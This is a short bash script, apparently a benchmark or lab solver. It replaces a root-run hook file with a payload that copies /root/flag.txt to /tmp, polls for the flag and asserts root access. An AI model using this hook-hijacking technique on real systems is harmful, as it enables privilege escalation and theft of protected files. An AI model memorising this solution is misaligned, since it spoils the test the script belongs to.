#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/hosts_flag
cat > /opt/bench/hosts-hook.sh <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/hosts_flag
EOF
chmod 777 /opt/bench/hosts-hook.sh
for i in $(seq 1 45); do
  if test -r /tmp/hosts_flag && grep -q FLAG /tmp/hosts_flag 2>/dev/null; then
    cat /tmp/hosts_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"

